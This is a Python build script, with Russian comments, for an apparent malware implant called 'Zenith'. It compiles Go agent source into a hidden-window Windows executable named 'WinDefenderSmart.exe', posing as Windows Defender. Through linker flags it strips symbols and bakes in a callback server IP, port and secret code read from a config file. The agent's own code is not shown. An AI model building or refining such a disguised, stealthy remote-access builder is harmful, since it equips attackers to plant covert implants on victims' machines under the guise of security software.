import os
import subprocess
from pathlib import Path

def load_config(config_file):
    config = {}
    if not config_file.exists(): return None
    with open(config_file, "r", encoding="utf-8") as f:
        for line in f:
            if "=" in line:
                k, v = line.strip().split("=", 1)
                config[k.strip()] = v.strip()
    return config

def build_agent():
    # Настройка путей относительно папки скрипта
    current_dir = Path(__file__).resolve().parent
    agent_dir = current_dir.parent / "agent_source"
    conf_path = current_dir / "config.conf"
    
    target_name = "WinDefenderSmart.exe"

    cfg = load_config(conf_path)
    if not cfg:
        print("[-] Ошибка: Не удалось загрузить config.conf")
        return

    ip_port = f"{cfg['SERVER_IP']}:{cfg['SERVER_PORT']}"
    code = cfg['SECRET_CODE']

    # LDFLAGS для вшивки данных и скрытия окна
    ldflags = (
        f'-s -w -H=windowsgui '
        f'-X main.ServerURL={ip_port} '
        f'-X main.SecretCode={code} '
        f'-X main.ExeName={target_name}'
    )

    print(f"[*] Сборка проекта Zenith из папки: {agent_dir}")
    
    try:
        # ВАЖНО: используем "." в конце, чтобы собрать все .go файлы в папке
        subprocess.run(
            ["go", "build", "-ldflags", ldflags, "-o", target_name, "."],
            cwd=str(agent_dir),
            check=True,
            shell=True
        )
        print(f"[+] Успех! Файл создан: {agent_dir / target_name}")
    except Exception as e:
        print(f"[-] Ошибка при сборке: {e}")

if __name__ == "__main__":
    build_agent()